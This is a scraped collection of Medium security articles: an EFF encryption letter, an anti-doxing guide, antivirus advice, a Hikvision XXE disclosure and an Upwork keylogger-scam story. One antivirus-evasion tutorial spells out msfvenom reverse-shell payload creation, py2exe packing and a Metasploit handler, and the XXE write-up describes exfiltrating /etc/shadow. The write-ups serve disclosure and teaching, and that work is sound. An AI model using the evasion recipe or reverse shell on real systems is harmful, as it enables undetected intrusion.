On the one hand, we have academics, security engineers, and mathematicians explaining that encryption isn’t something we can negotiate away. On the other side of the debate, we have those who want an easy answer. We’re confronted with crypto-critics like FBI Director James Comey, the attorney general, and others whose expertise in criminal investigations doesn’t prepare them to appreciate the technical ramifications of what they are proposing. However well-meaning, they’re seeking to take advantage of recent tragedies to advance a course that could undermine the security of all of us.
President Obama, we need to let facts and reason win the day. That means standing up for math, even if it’s not politically popular. Please respond to the 100,000+ people who have called on you to oppose backdoors through savecrypto.org, and let security be your legacy.
Crossposted from the EFF Deeplinks blog. Updated to clarify the type of security breach Apple suffered in 2014.
Written by
","['Cybersecurity', 'Security', 'Politics']"
ANTI-DOXING GUIDE FOR ACTIVISTS FACING ATTACKS FROM THE ALT-RIGHT,https://medium.com/@EqualityLabs/anti-doxing-guide-for-activists-facing-attacks-from-the-alt-right-ec6c290f543c?source=tag_archive---------2-----------------------,"Hey Movement Fam,
It is the folks from Equality Labs and we have an urgent Anti-Doxing guide to support the activists who are getting slammed by Alt-right Forces around the country for coming out and resisting Nazis from Charlottesville to Berkeley.
This guide has been created to deal with the current issues we are seeing and should be incorporated into your regular digital security practices. We know that the escalated activity of the White Supremacists is scary, but the best defense now is one rooted in information, compassion and self-care for ourselves and each other, and a commitment to collective resilence.
With that we have broken up this guide in terms of background and next steps. If you have any questions please feel free to email us at equalitylabs@protonmail.com or hit us up on twitter at equality labs
BACKGROUND
Post Charlottesville, Boston, and the Bay Area Anti-White supremacist marches we are seeing an unprecedented number of doxing attacks on all members of the movements.
Doxing is the violent Internet-based practice of researching and broadcasting private or identifiable information about an individual or organization in order to harass and traumatize activists from organizing activity. Additionally such attacks can also be accompanied by real world violence and spread disinformation about and individual and/or a movement.
Hostile individuals can get this information by searching publicly available databases and social media websites like Facebook, as well as by hacking, and social engineering.
We believe that many of the Alt-right attackers of our colleagues around the country are using their full social media ecosystem to both attack and spread disinformation. So we want to make sure that people stay safe by adopting best practices. The practices below will help lock you down through the attacks and need to be maintained to keep your digital resilence.
Here is our check-list for protecting your identity:
✔ CREATE A SELF-CARE PLAN and recruit your family and friends to help support you. Let them know whats going on, because trolling and doxing can be traumatic and you must priortize your mental and physical health so that you can last past these attacks.
For us we take our lead from our collaborators at Stop LAPD Spying Coalition who talk about adopting a vision of Security culture that centers all collective security practices as a form of expressing love and solidarity. We all have a sense of it from being marginalized, targeted, activists. It’s about harnessing those good instincts with knowledge and practice.
This is why it is important, even when you are under attack, to give space to your feelings of anxiety and dread, but do not succomb to them. Release them and return to your agency. Because in these situations we can practice a culture of mutual-aid and support around digtial security.
We can build power instead of paranoia and meet people where they’re at. From there we can have communities of practice that normalize better practices in a way that is resilient in a crisis.
✔ CREATE AN INCIDENT LOG. This is crucial to establish patterns of your attacks and can be useful to compare with other organizers to identify larger patterns within the attacks to identify opponents and their organizations.
A sample log could look like this:
But please feel free to create one that makes sense for you and that you can adapt to your situation. The most important thing is that you keep notes throughout your attack and share with your security professional when you can. If you like this one you can use this document as an example. Plese feel free to make a copy.
But please note: we recommend that you keep incident logs not in google docs but in an encrypted word processing platform like Etherpad on Riseup at https://pad.riseup.net or Cryptpad at https://cryptpad.fr.
✔ CHANGE YOUR EXISTING PASSWORDS. Trolls will be trying their best to get into all of your accounts. You can find out if you e-mail is part of any recent hacks at www.haveibeenpwned. This will let you know what level of risk you are at for penetration of your accounts.
After you have made that quick assessment, make a list of all of your crucial accounts and change the passwords immediately so you have fresh passwords for each.
Additionally, if you have time we strongly recommend incorporating a password manager to to generate and store all of your new passwords. This will allow you a greater capability to create complex passwords for all of your accounts while limiting you to only remember one. We recommend 1password at https://1password.com/ , keepassX at ,and lastpass.
✔ TURN ON 2-FACTOR AUTHENTICATION (2FA) for all your accounts. This means you are adding another verification method when you sign into your accounts. This helps when you have trolls trying to break into your account. If they only have your password they will be stopped at the second point of verifcation.
When thinking about which accounts you want to add 2FA you have to think like a troll. Which accounts do you have that would cause the most damage if it was compromised. By taking over your e-mail they can release and interfere with your communication, by taking over you bank account they wreak havok with your finances, etc. So if can lock them all down.
2FA is available for G-mail, Facebook, Twitter, Amazon and more. We recommend that you add 2FA but please when possible avoid using Text/SMS as your method of verification. This is because texts can be intercepted and so are not secure. We recommend using Google Authenticator app or an app like Authy. These can generate codes on your phone and can be revoked remotely in the chance thaty our phone is confiscated, stolen, or lost.
You can find tutorials for all 2FA instructions for most of your accounts here at. https://www.turnon2fa.com/tutorials/ and also here https://twofactorauth.org.
✔ FIND OUT WHAT INFORMATION TROLLS CAN FIND OUT ABOUT YOU. Search for yourself on Duckduckgo and try doing this search in incognito mode. This will give you a sense of how much data exists about you online to people who are not in your network. After that inital search you can go on to looking at all of the data brokers sites that trade in our personal livs.
Check your Data leaks and Opt out here:
While it is hard to get all of the content off, every little bit helps. Ulitmately though the challenge to you data off these sites is an uphill battle because there are hundreds of these sites and most organizers have very little time to do this work.
In an Urgent case of doxing and if you are simply over capacity in terms of your rapid response then consider using a service like Privacy Duck. They are incredible and have been working with activists around the country to scrub their data. There is an activist subsdized rate that we can arrange through Equality Labs. So if you feel like you need this and qualify then please e-mail us equalitylabs@protonmail.com. You can The great thing about Privacy Duck is they share all their free how-to opt-out videos on their YouTube with detailed, step-by-step instructions at: https://www.youtube.com/privacyduckcom.
✔ CALL YOUR CREDIT CARDS, CELL PHONE PROVIDER, UTILITIES, AND BANK AND LET THEM KNOW YOU ARE A TARGET. Many times trolls will take the online attacks into the physical world by trying to go after your credit cards, utilities, and bank accounts. They can access these to try to drain your accounts or worse. In a case of raised stakes please call them to let them you are target and they can often add an additional layer of security that can help protect you during this time.
✔INSTALL A VIRTUAL PRIVATE NETWORK (VPN) on your phone to protect your network access. This helps to privatize your network traffic and bypass filtering happening at your internet service provider. It also makes sure that trolls can’t find you by using your IP address. We recommend Private Internet Access and Vypr VPN, but whatever VPN you use always read the privacy policy to make sure your service does not sell, store, or share your data and that they will protect it if engaged by the state.
✔USE THE TOR BROWSER. A VPN is great because it can offer privacy but only the TOR Browser offers real anonymity. This is because rather then going through a VPN’s servers, your internet traffic is channeled through three computers who store none of the data while it is in transit.
Another option of course is to use the Tor Browser. This option is free and provides real anonymity but does not always load multimedia heavy sites. Try it out and see, we recommend using TOR at least once a day so it becomes part of your daily usage and it won’t be unusual if you have to use it for an urgent situation.
✔INSTALL SIGNAL. This secure messaging and voice app can take the place of text, phone, and e-mail when installed on your phone and computers. What is important is that you must first install it on your phone and make sure you verify all the users. You can find it here for iPhones and here for Android. Additionally make sure you add it to your chrome browser so you can add Signal Messaging to your desktop.
✔WEAN YOURSELF OFF G-MAIL AND BEGIN USING ENCRYPTED E-MAIL. G-Mail collaborates with the government on many surveillance programs including the PRISM project. So while Googles extensive protection will help you from individual hackers there is still the inheren threat that all of your data in your account can be searched and stored onto NSA servers with no consent on your part. As a result we recommend if you are using G-Mail use a form of encryption like GPG Encryption for MAC or https://gnupg.org for the PC. These are the safest but the set up of your own GPG can be daunting. In that case use encrypted e-mail services like Tuanota or Proton Mail. We like Tuanota because they are open source and Proton Mail because of its use and scalability. Both services embed your encryption key as part of your service and its interface is similar to g-mail.
✔FOR SECURE GROUP CONVERSATIONS USE TALKY.IO OR ZOOM. All other protocols including freeconference call are not secure. This includes Skype, google hangouts, and facetime. Talky.io is free but can be wonky while ZOOM works but has limited time in its free version. If you are using Zoom make sure you go to the settings and turn on encryption.
✔CHANGE YOUR PRIVACY SETTINGS ON YOUR SOCIAL NETWORKS. Visit your privacy settings for Facebook, twitter, snapchat, and instagram to PRIVATE and block all trolls who already follow you.
LINKEDIN
For many, professional connections can be at particular risk if they are found to be engaging in political activities.
To disable public visibility of your profile, go to https://www.linkedin.com/public-profile/settings and on the right hand side you will see “Your profile’s public visibility”. Switch this to “Off”. Further information can be found here: https://www.linkedin.com/help/linkedin/answer/77#user-profile
FACEBOOK
For All of your Facebook privacy settings you can find them here https://www.facebook.com/help/325807937506242/
Key to change are the following settings.
TWITTER
✔KILL ALL ORPHAN ACCOUNTS. Remember trolls are going to use whatever information they have of you online to get into as many accounts you have. Orphan accounts or accounts you have not used in a long time can make you vulnerable because if they are using and older password they can try that accounts technical support to get more data about you that they can try to use for other accounts. So be on the safe side and shut them down. You can get a list of accounts that you may have forgotten you signed up for by going to https://namechk.com
✔USE ALIASES WHEN SIGNING PETITIONS OR SIGN-IN SHEETS FOR MEETINGS. One of the number one ways people are getting their names on doxxing lists for the White supremacists is through petition websites and sign sheets. Our recommendation is to absolutely not use real names, phone numbers or e-mails for these kinds of activities. When possible compartmentalize. Use an e-mail that is only used for their activities that cannot be tied back to your real life details. Additionally for phone consider using google voice or an app like burner app to not divulge your personal information. Finally an alias for these sign up purposes can be your best protection because if they don’t know your name how can they find you.
✔FINALLY SECURE AND BACK UP YOUR HARDWARE. This is going to take some time so take a couple of hours and follow the Equality Labs digital security one sheets here: https://docs.google.com/presentation/d/1rtWqtbY_tVnncCEEEfRXInN1atSjodloBAaJqRICxAg/edit?usp=sharing
OKAY! We know that is a lot but keep in mind digital security is a system that you are creating and implementing as part of your core skills as an organizer. There is no silver bullet to digital security, it is an awareness and a practice that gets better with reiteration and with a community committed together to stay safe. The best defense now is a collective one and we are all in it together.
So please stay safe and if you have any urgent questions please contact us at equalitylabs@protonmail.com or on our website at equalitylabs.org or follow us at twitter equality labs.
Written by
","['block together', 'Security', 'Digital Security', 'Anti Doxing', 'Equality Labs', 'Cybersecurity']"
Antivirus Evasion with Python - InfoSec Write-ups - Medium,https://medium.com/bugbountywriteup/antivirus-evasion-with-python-49185295caf1?source=tag_archive---------1-----------------------,"When deploying defense in depth security controls for your organization, you are likely to include antiviruses as part of the solution. That is definitely a good practice as long as we keep in mind that antiviruses are just adding an extra layer of protection and we should never solely depend on it for protecting end-users devices.
A good security program should always include defense in depth controls such as software update governance, firewalls, training/security awareness, physical security, identity management, password policy, etc. However, it is not uncommon for a security engineer to get challenged about the need for those extra layers, and you may need to demonstrate how antiviruses can be easily bypassed to prove your point.
In this article we will present a very straight forward tutorial on how to evade antiviruses on fully patched and updated Windows environments using a Python payload.
Keep in mind that attempting antivirus bypass is a cat and mouse game. Whenever a new evasion technique gets popular, antivirus vendors will eventually learn about it and update their signatures database to block it. Then, new evasion techniques will arise, which will make vendors to add it to their signature database, and so on and so forth.
By the time of this writing, the method described here was successfully used to bypass all the vendor engines available on Virus Total, and get the malicious artifact successfully executed on a fully updated Windows 10 machine with Windows Defender enabled.
Signature-based antiviruses work by comparing the artifact binaries against a signature database. Our goal is to “disguise” our payload in a way they do not match any known signatures on any antivirus vendor database. A behavior-based antivirus will try to match known suspicious activities to the actions taken by a given artifact. Our malware will work as a mere client trying to start a TCP connection on port 443. It makes harder for behavior-based antiviruses to flag actions like this without issuing a lot of false positives for legit applications such as web browsers.
For this example we are going to use a Python payload generated by MSFVenom to open a reverse TCP shell (meterpreter session) on port 443 to the attacker machine running Metasploit. An artifact like that is obviously malicious and should always be flagged by any antivirus agent.
The approach described here is flexible enough so you can extend it by replacing our sample msfvenom payload with your own customized Python payload.
We recommend using 3 virtual machines for this tutorial:
Kali Linux for creating the payload and running Metasploit;
Windows Metasploitable 3 for packing the payload into an artifact;
Windows 10 fully patched for running the final artifact;
The reason we used 2 distinct Windows virtual machines is because we need a fully updated/patched box to make sure our artifact will have a very high chance to work on any given Windows environment. On the other hand, before packing the payload with Py2Exe, a fully patched machine will always flag the raw Python payload, giving you a hard time working with it. Hence, the need for the Metasploitable 3 virtual machine for handling the raw payload before it is packed.
For creating the the artifact we recommend using the Windows Metasploitable 3 as your main Windows environment.
Install Python 2.7.16 x86 for Windows: https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi
*Note: Python 2.7 x86 is required. Install the 32 bits version even if your Windows is a x64 box. Also, make sure to select the option “Add python.exe to Path” during the installation
Install Py2exe 32 bits for Python 2.7: https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe/download
Optionally, install Open SSL for Windows.
Switch to the Kali Linux machine and create the Python payload.
*Note: Our Kali Linux is using IP address 10.0.2.10. Make sure you replace it by your current IP for the all the remaining steps in this tutorial.
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.2.10 LPORT=443 -f raw -o /var/www/html/mrtp.py
service apache2 start
Copy the payload “mrtp.py” back to your Windows machine. Using powershell, run:
wget http://10.0.2.10/mrtp.py -O mrtp.py
Also, create a setup.py file with the following content:
Bundle the standalone Python executable with Py2Exe:
python.exe .\setup.py py2exe
Test the artifact “mrtp.exe” created under the dist folder:
Run it:
.\dist\mrtp.exe
Switch back to you Kali Linux and run Metasploit:
We assume the following configuration: Kali VM IP: 10.0.2.10
msfconsole
use exploit/multi/handler
set PAYLOAD python/meterpreter/reverse_tcp
set LHOST 10.0.2.10
set LPORT 443
run
*Note: Depending o how long you take to set the Metasploit handler, you may need to run mrtp.exe on the Windows box again.
Now that we have confirmed our artifact works, let’s check it against all the Antivirus engines available on VirusTotal. Visit www.virtutotal.com and provide your “mrtp.exe” file for scanning.
If everything goes well, you should get a clean report similar to the following.
Now it is time to run it on the Windows 10 machine. Copy the “mrtp.exe” file directly to the Windows 10 box. In a real life exploitation you would need to leverage some attack vector to deploy it and execute it on your target, however, that is out of the scope of this article.
Make sure your Metasploit handler is listening on port 443, and run the artifact “mrtp.exe” on the Windows 10 machine.
As shown on the screenshot, the artifact executed completely undetected and a meterpreter session was successfully established.
You can leverage this technique and use your own customized Python payload. All you need to do is to repeat the steps from the previous session, editing the “mrtp.py” file after generating it with msfvenom. You will have to replace the original encoded base64 string with your own Python code.
Just as an example, let’s create a new “custom_payload.py” Python script that just prints two messages and use it as our new payload.
After creating it, we will need to encode it with base64 encoding:
cat custom_payload.py | base64
For the sample script we used, it will give us the following base64 encoded string: “cHJpbnQgKCJDdXN0b21pemVkIHBheWxvYWQiKQpwcmludCAoIkl0IHdvcmtzISIpCg==”
Now, we edit the existing “mrtp.py” script we used on the previous session, and replace the original base64 string that begins with “aW1wb3J0IHNvY2t” with our new one.
After customization, the final result should be similar to this:
Copy the new “mrtp.py” back to your Windows machine and repeat the bundling steps:
wget http://10.0.2.10/mrtp.py -O mrtp.py
python.exe .\setup.py py2exe
.\dist\mrtp.exe
After executing the new “mrtp.exe” bundled Python artifact we get “Customized payload” “It works” strings printed on the terminal.
At this point, you should be able to create any Python FUD artifact you want just by editing the “custom_payload.py” file and bundling it with Py2Exe.
Written by
","['Archive', 'ABOUT US', 'Bug Bounty', 'CTF', 'Discord Server', 'Interviews', 'Discord Group', 'Python', 'Windows 10', 'Antivirus', 'Cybersecurity', 'Hacking']"
Antivirus in 2017: Why? Which? How? - Andrew Douma - Medium,https://medium.com/@securitystreak/antivirus-in-2017-why-which-how-88d6d5e6655c?source=tag_archive---------0-----------------------,"Teach anyone how to find an efficient and free Anti-malware product within 20 minutes by sending them this article. (July ’17 Edition)
This is a skill I promise will serve you for years to come. I aim to teach how to fish for free rather than tell you which fish is fresh at today’s market.
Andrew Douma is a vendor-neutral IT Security Professional. He performs professional audits, penetration tests, and risk assessments. He designs secure networks and engineers high-assurance systems in the Cloud.
You can connect with him on GoodReads, LinkedIn, Medium, and Twitter.
Buying a professional penetration testing laptop| Evaluating QubesOS as a Penetration Testing Platform | Finding the right exploit code | Penetration Testers’ Guide to Windows 10 Privacy & Security | Full Disk Encryption with VeraCrypt | Hacker to Security Pro! On the Shoulders of #InfoSec Giants | Securing an Android Phone or Tablet (LineageOS) | Password (IN)SANITY: Intelligent Password Policy & Best Practices | Security Architecture Patterns I & Patterns II
Antivirus products rely on detecting a “signature” inside of all your files — a string of text with a malware authors’ name or the file hashes being that of a known malicious executable.
Trained penetration testers (and cyber criminals) can bypass most anti-malware solutions with ease. With more effort, those super expensive Next Generation Firewalls (NGFW) we configure for Enterprise clients are no match either.
Changing the signature is often enough to prevent detection. More and more malware we come across has a unique signature for every machine it infects. Why Pirating software is so high-risk!
NO! The Internet would improve if everyone had an adequate Antivirus product installed on every device.
The continued expansion of Botnets, delivering Denial of Service (DoS), Banker Trojans and Ransomware payloads, should be proof enough.
The fact remains: Antivirus software protects you against 90% of malware known to humankind — up to the point you last updated it!
For enterprises:
In an Enterprise environment, a secure operating system (OS) baseline & whitelisting offers greater performance and security.
“Antivirus does some useful things, but in reality it is more like a canary in the coal mine. It is worse than that. It’s like we are standing around the dead canary saying: Thank god it inhaled all the poisonous gas! — Darren Bilby
Hire a qualified professional if your Threat Model requires a higher level of assurance. One with the hands-on technical skills to audit the solutions that collectively provide the Defense in depth your Threat Model requires.
For consumers, it is often cheaper and easier to just buy a new laptop than hiring a security professional or applying a secure baseline.
Remember, Antivirus cannot protect you against:
Certainly, the effectiveness of a particular Antivirus product changes over time. Good and bad guys are pushing the boundaries of what we can do with our hardware every day. Companies go out of business or are bought up for their brand value alone. Malware analysts leave for greener pastures.
You can find an initial comparison on Wikipedia. Despite it providing an introduction to the type of features you can expect, it does not answer any questions like:
This is where professional Antivirus testing labs come in.
OPSWAT is a for-profit software company that provides solutions to manage and secure IT infrastructure (United States). They test Antivirus software to ensure their detection rates, false alarm response times, and ability to work with other security applications is up to snuff.
Any program with the OPSWAT Gold certification has passed all their criteria.
AV-Comparatives is an independent organization that checks whether security software lives up to its promises (Austria). They do so with scientifically sound testing methods and one of the largest malware sample collections worldwide.
Certification by AV-Comparatives provides a general approval, but their Real-World Protection Test is more comprehensive and replicates common scenarios that most of us experience when using a computer with an Internet connection.
Any program with the AV-Comparatives Advanced+ certification has performed well in all of their tests.
Similarly, AV-Test is an IT security service provider focused on anti-virus research (Germany).
Though a smaller fish in the pond of Antivirus testing labs, I appreciate that they factor in the usability of the security software itself, as I am sure you will as well. They test fewer products and perform tests less frequently than the other labs.
(click on a relevant filter)
The first Antivirus you try out may not be the one you stick with.
Some are poorly written and have a reputation for consuming a lot of memory or hogging the CPU. On-access or full system scans perform inefficient read/write operations — a common bottleneck for systems without a Solid State Drive (SSD).
Some come bundled with Host Intrusion Prevention (HIPS) functionality, that tries to check if code about to run is malicious in nature, or ask for your approval to connect to the Internet. Not all may be to your liking.
For example, I opted to uninstall Avira once I realized it does not allow me to exclude files and folders from its scan. A pity, as it did well against a set of recently-leaked exploit kits I keep around.
If you are ever annoyed by your Antivirus software, uninstall it, come back to this article and pick another option.
Whichever Antivirus software you decide to try, be mindful of these tips during installation and configuration:
I evaluated several Antivirus products on Windows, MacOS, Android, iOS and Linux. This July 2017 advice will have become outdated by September 2017 (so check back then!).
Upgrade to the latest version of Windows 10. Windows Defender is getting more effective! Always install OS updates.
If you are tech-savvy enough to backup important files first, run the most recent version of /r/TronScript, a free and open-source script that automates the process of disinfecting and cleaning up Windows systems.
Then install any high scoring scanner such as Avast / Avira / AVG — though I’ve found those can be a bit pushy about buying their ‘premium’ version.
Enterprise (security) providers Sophos and Cisco offer free versions of their endpoint protection products for home use.
Install the multi-AV-engine based tool HerdProtect for periodic checks. Using multiple engines does increase the false positive rate.
Try out Avast and if that does not suit you, install Sophos. Keep Malware Bytes around for periodic checks. Avira gave me a lot of grief about paying for their product.
Do not forget to check out the free security tools by Patrick Wardle (Objective-See) and Kristov Atlas (OSX-Config-Check).
Premium features provided by LittleSnitch and LittleFlocker are useful, though I recommend the more user-friendly Hands Off! — which combines the functionality of both.
Always install Android updates, because your provider might never push those, consider flashing older devices with CopperheadOS or LineageOS.
Install AhnLab (Google Play) or AVG (Google Play). Sophos also has a free option for home use (Google Play).
Always install iOS updates. Install Sophos (Apple Store) or Avira (Apple Store).
Whether you are running Linux as a Desktop, scan incoming attachments on a Mail server, or scan user uploads on any Web server…
I recommend adopting a multi-AV-engine approach, like multi-av or the Linux Malware Detect project.
Pay close attention to the output from Lynis the open-source auditing tool. Apply OS updates daily and keep a watchful eye on OpenSSL vulnerabilities.
Vendors are moving into the IoT market with Antivirus-equipped wireless routers. I doubt if these are capable of delivering on the stated promises.
Just keep your devices up to date, it’s not that scary:
I am upgrading Malware Bytes from an honorable mention to my recommendation. [July ’17] Their solution runs on macOS/Windows and for free on Android.
Alternatively, I’d place your trust in ESET. In my experience, their products are capable and very resource efficient. A multi-device license is reasonably priced and covers Win/Mac/Droid devices. Their Antivirus for Linux is not included.
However their software engineering team is not without fault: remote root MacOS bug, trivial to exploit ESET AntiVirus. ESET was one of two vendors to quickly block the EternalBlue attack technique used in WannaCry and not just its payload signature.
Click the ♡ to recommend this article.
Written by
","['They often ', 'installing', 'Cybersecurity', 'Antivirus', 'Malware', 'Endpoint Security', 'Windows']"
An unlikely XXE in Hikvision’s Remote Access Camera Cloud,https://medium.com/@iraklis/an-unlikely-xxe-in-hikvisions-remote-access-camera-cloud-d57faf99620f?source=tag_archive---------4-----------------------,"TLDR: While trying to get admin credentials on my locked down Elisa Live IP camera, I discovered a XML External Entity (XXE) vulnerability on one of the backend systems of HiKVision, the manufacturer of the camera which is the market leader on IP cameras and PVRs.
Insecurity and the IoT era go hand in hand. A quick search in google will reveal hundreds of white papers and articles that have been published over the last few years.
About two months ago I had a free weekend so I wanted to play around with a cloud camera. I searched in Amazon for a cheap one with no published security vulnerabilities. I found this one: Elisa Live 720p HD IP Camera.
I will try to keep this post short so I will focus on the discovery of the XXE. I will not detail all the steps that I took to investigate the camera itself, only the relevant parts that lead to the XXE discovery.
The camera itself is a white-labelled RC8221 manufactured by Hikvision, a $20bn company that is the market leader (~20%) in the surveillance products industry. Elisa, a Finnish company, provides a cloud app that you can access in order to view the live stream of your camera.
As the trend dictates, you cannot get access to the camera itself without going through their cloud platform. In other words, the camera’s stream is uploaded to their backend system and you access the stream through a web or mobile app.
I connected the camera through its Ethernet interface to my lab and started intercepting network traffic. If you ever want experiment with IoT devices I highly recommend that for your first round of investigation you do not have an active internet connection. Some devices are shipped with old/insecure firmware, the very first thing they will do is check if an update is available.
Wireshark revealed two interesting and unencrypted calls:
A POST request to www.hik-online.com, Looks like a base64 encoded password. Let’s note this down for later.
And a GET request that downloaded the updated firmware from an s3 bucket.The firmware can be downloaded here.
A quick nmap scan showed a few open ports, including a web server with a login form. After trying a few default username/password combinations common for hikvision cameras, I quickly realised that I wasn’t going to go anywhere. The controller that accepts the credentials is protected with HTTP Digest Access Authentication, a unique feature of this firmware.
Playing around with the firmware using binwalk and hiktools,I was able to extract some interesting information, but nothing regarding the Digest Authentication. Just for reference, the root password is hiklinux, these are the contents of the /etc/passwd file:
The SSH port was closed so I couldn’t take advantage of this. I have to note that on my very first portscan before updating the firmware ssh was open.
At this point I backtracked and tried explore other avenues.
Going back to the first POST request we can see that it includes a base64 encoded string. Unfortunately it decodes to garbage, meaning that it’s probably symmetrically encrypted. The key has to be somewhere in the firmware, it’s just a matter of finding it. I didn’t verify if this password is used to authenticate the camera to the server, or if this is a password that is generated by the camera upon boot and submitted to Hikvision.
I have to admit that I was a bit discouraged with my progress. Over two days spent with little to show. I quickly browsed Hikvision’s website and found this:
Send E-mail to HSRC@hikvision.com to report the security flaw you find and we will contact you as soon as possible. To protect information security for users and enterprise, please do not publish or spread the flaw. HSRC will reward the reporter according to the Hikvision Security Flaw Assessment.
Cool, a bug bounty program. Let’s play around with the POST request.
As this is an XML post request, the first thing I tried was to see if we can request a local or external file with the SYSTEM entity. The local file method didn’t work, so I fired up a VPS and waited for incoming connections. It worked:
Things were starting to get interesting. Since we can use the SYSTEM entity to load external files, let’s try to pass a malicious DTD that will call back to our VPS with the contents of a file, say /etc/hosts.
A great tool that automates this procedure is XXEinjector.
Success. We can read arbitrary files on the server. But what permissions does the Tomcat server run with? We were able to get the contents of /etc/shadow, so root.
At this point I stopped and started the process of disclosing the findings to Hikvision. If I was a malicious attacker, I would probably continue by fully enumerating the 10 servers (The vulnerability existed in all geographically distributed API servers of hik-online.com). If getting the Tomcat database connection strings didn’t lead anywhere, there probably would be more things that one could look for like scripts that connect to other server with hardcoded credentials.
Ultimately, It wouldn’t be that difficult to get access to more than 100k cloud based cameras and DVRs.
The vulnerable servers are part of the backend system of http://www.hik-online.com/ , a service that Hikvision offers to access your PVRs and Cameras via the web.
If you are accepting XML content, make sure you are not vulnerable to XXE. Also make sure you use HTTPS for EVERYTHING, I cannot think of any reason to not do so.
Written by
","['Security', 'Cybersecurity', 'IoT', 'Penetration Testing', 'Cloud Computing']"
An Unusually Well-Disguised Malware Scam on Upwork: How I Almost Got Infected With a Keylogger,https://medium.com/hackernoon/an-unusually-well-disguised-malware-scam-on-upwork-how-i-almost-got-infected-with-a-keylogger-a638b7c51927?source=tag_archive---------1-----------------------,"The following is a copy of a post I made on Reddit.
Usually, I try to keep my main Reddit account separate from anything with my real name on it. But the truth is, this is something I wanted other people to know about — especially other freelancers who use Upwork to find clients.
So I’m willing to take the risk of exposing my real name. If you copy-paste some of the text into Google, you can probably find my posts. I can always make another Reddit account if this becomes an issue.
This is a post about a scam. This wasn’t the typical scam where you work and they don’t pay you. I’ve run into that one several times before. This was something different.
This was an attempt to infect people with a keylogger, for the purpose of stealing passwords.
I’d heard before that these things happen on Upwork. In fact, I applied for a job in 2016 that ended up being a phishing attempt. I recognized it right away, but it was still surprising.
Now, I was scammed before on Elance a couple of years ago. I did about $3,000 worth of work, for which I was never paid. I’ve seen that same scam pop up recurrently, but it tends to follow the same pattern.
This one was different. I documented the experience with screenshots. I decided to share this with the community because it was relatively well disguised, and I’m sure I’m not the only one who applied for this so-called “gig.”
I’m a copywriter and content writer, and this was a writing gig. However, I’m sure that similar scams are probably targeting other professions as well.
Here’s what happened.
I’ve been using Upwork here and there to find new clients. I’m quite selective about which gigs I apply for, and I don’t bother with anything below a certain rate. $5 for 1,000 words? Hahahaha, no.
So anyway, this gig came up in my feed with an unusually good pay rate. $100–120 for an article around 1,000–1,200 words is actually pretty standard in general, but it’s rare to find anything that decent on Upwork.
By the time I applied, the gig had been up for all of 45 minutes and already had 20–50 proposals. However, due to the decent pay rate and promise of regular work, I figured I’d throw my hat in the ring anyway. I’m aware that clients get quite a few proposals in broken English from people who are wholly unqualified for the position, so I figured that some of those proposals were probably a no-go.
Here are some screenshots of the gig.
This is a pretty standard description for an Upwork writing gig.
As you can see, they got quite a few takers.
As you can see, they’re new to Upwork, and their payment method was unverified. This can sometimes be a red flag, so I made note of this. However, worst case scenario was that the gig wasn’t legit, so I gave it a try anyhow. It did not follow the recurring pattern of the scams I’ve encountered in the past.
I was chosen for an interview, and provided with a Skype ID to add to my contacts so that they could talk to me about the project. Cool.
I added “Judith” on Skype and reached out.
At this point, they sent me a .zip with their project guidelines.
There were two files. One was a PDF titled “Formatting for All Content.” That file worked fine. It detailed the formatting requirements, which were pretty straightforward.
The second file was titled “Payment Terms,” but was showing as a shortcut, not a file. Clicking it did nothing.
Naturally, I let them know that they’d accidentally sent me a shortcut to the document, not a copy of the actual document itself.
If you’re tech-savvy, you’re probably thinking, “Aww, HELL naw.” I, however, am not particularly technical, so I didn’t realize at first what was going on here. I honestly thought they’d accidentally put a shortcut to the document into the .zip folder.
Figuring that the shortcut file had been a mistake, I asked if they could resend the file.
It was still showing as a shortcut, not a file. Helpfully, I took screenshots to show them.
They responded as follows:
As you can see, I asked if they’d just send me the file directly. I’ve sent tons of PDFs, image files, and MS Word documents via Skype, so I knew it was possible to do so easily.
I realize it was dumb of me to try to disable Malwarebytes, but fortunately, the file still refused to open. However, to my knowledge, that doesn’t mean a keylogger wasn’t installed.
Now, this is where I started getting suspicious. There’s no way a PDF or Microsoft Word document with payment terms would be too large to send via Skype.
Previously, I’d assumed some kind of technological incompetence. This person was presumably an editor of some kind, not someone in a technological role. And it’s pretty surprising how tech illiterate some people can be. A brief examination of /r/talesfromtechsupport illustrates this phenomenon.
But at this point, I started to suspect that something was probably fishy here.
They offered to try sending the file yet again.
It still didn’t work.
After going into “Properties” and seeing that weird-ass file path, I was definitely suspecting some kind of malware infection attempt. I had heard that such things do happen on Upwork, but had never experienced it myself.
Again, if you’re tech-savvy, you’re shaking your head right now. Please pardon my ignorance at the time. I didn’t realize what that file path really meant until later.
It was at this point that I decided to use one of my usual scam detection strategies. I went to the user’s Skype profile and took a screenshot of their profile image. Then, I did a reverse image search.
The reverse image search revealed multiple search results indicating that the photo belonged to Julia McCoy, a professional writer and the CEO of a copywriting agency called ExpressWriters.
After examining that particular agency’s Pricing page, it was clear that this gig couldn’t possibly be for that company. The prices wouldn’t make sense, based on what they’re charging their clients.
I sent one further message.
Naturally, they didn’t respond back.
My SO googled the file path, and realized it was a shady program. I was then informed by several Reddit commenters that they’d fallen victim to the same scam, and that it had installed a keylogger. Some of them had had money stolen from their Paypal accounts, or had had their Gmail account stolen.
Alarmed, I cleared my browser history immediately, which contained saved passwords. I was sure not to log into Gmail, Upwork, Paypal, or anything else important.
I reached out to a good friend of mine who works in IT. He advised me to go ahead and do a full factory reset on my laptop.
I did so, and changed all of my passwords from a different device.
As of now, I seem to have made it out intact. I got very lucky.
The reason I decided to share this was that up until partway through the Skype conversation, everything seemed like it could very well be legitimate.
Scams are getting less obvious, apparently. Always be careful with Upwork clients. Make sure you know who you’re working for, and don’t be afraid to ask them for a company name, a LinkedIn profile, or anything else to show you that they’re a legitimate person or agency.
I was able to take action quickly enough to prevent myself from being victimized. Others weren’t so lucky. It’s scary how clever scammers can be with their social engineering, and how many of them are lurking in places where you wouldn’t expect that kind of thing.
Hacker Noon is how hackers start their afternoons. We’re a part of the @AMI family. We are now accepting submissions and happy to discuss advertising & sponsorship opportunities.
If you enjoyed this story, we recommend reading our latest tech stories and trending tech stories. Until next time, don’t take the realities of the world for granted!
Written by
","['About', 'Help', 'Go Home', 'Freelancing', 'Cybersecurity', 'Scams', 'Freelance Writing', 'Upwork']"
